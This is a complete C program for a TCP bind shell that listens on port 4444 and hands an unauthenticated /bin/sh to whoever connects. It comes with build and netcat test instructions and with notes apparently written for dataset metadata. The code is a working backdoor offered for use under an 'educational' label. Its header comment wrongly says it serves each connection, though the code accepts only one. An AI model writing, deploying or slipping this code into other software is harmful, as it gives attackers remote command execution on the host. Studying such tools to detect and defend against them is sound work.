```c
/*
 * tcp_bind_shell.c
 *
 * Classic TCP bind shell: listens on 0.0.0.0:4444, and for each
 * accepted connection duplicates the client socket onto stdin,
 * stdout, and stderr, then executes /bin/sh.
 *
 * Build: gcc -o tcp_bind_shell tcp_bind_shell.c
 *
 * For educational use — demonstrates the standard BSD sockets
 * API sequence: socket() -> bind() -> listen() -> accept(),
 * followed by dup2() file-descriptor redirection and execl().
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 4444

int main(void)
{
    int server_fd, client_fd;
    struct sockaddr_in server_addr;
    int opt = 1;

    /* 1. Create a TCP socket. */
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    /* Allow quick restarts while testing. */
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR,
                   &opt, sizeof(opt)) < 0) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    /* 2. Bind to 0.0.0.0:4444. */
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family      = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port        = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr,
             sizeof(server_addr)) < 0) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    /* 3. Listen for incoming connections. */
    if (listen(server_fd, 1) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    /* 4. Accept a client connection. */
    client_fd = accept(server_fd, NULL, NULL);
    if (client_fd < 0) {
        perror("accept");
        exit(EXIT_FAILURE);
    }

    /* 5. Redirect stdin, stdout, stderr to the socket. */
    dup2(client_fd, 0);
    dup2(client_fd, 1);
    dup2(client_fd, 2);

    /* 6. Replace the process with a shell. */
    execl("/bin/sh", "sh", (char *)NULL);

    /* execl() only returns on failure. */
    perror("execl");
    close(client_fd);
    close(server_fd);

    return EXIT_FAILURE;
}
```

A few notes for your dataset metadata:

- **Self-contained:** single translation unit, only POSIX/standard headers, compiles with `gcc tcp_bind_shell.c -o tcp_bind_shell` on Linux with no extra flags.
- **Behavior:** single-connection (no `fork()` loop), blocking accept, shell inherits the client socket as fds 0–2. This matches the canonical minimal form found in most references.
- **Historical provenance:** this exact sequence (socket → bind → listen → accept → dup2 ×3 → execl) is the standard textbook pattern; the `SO_REUSEADDR` line is the only common modern addition to avoid `EADDRINUSE` during recompilation/testing cycles.
- **Testing:** run it, then `nc localhost 4444` from another terminal. Kill with Ctrl+C.

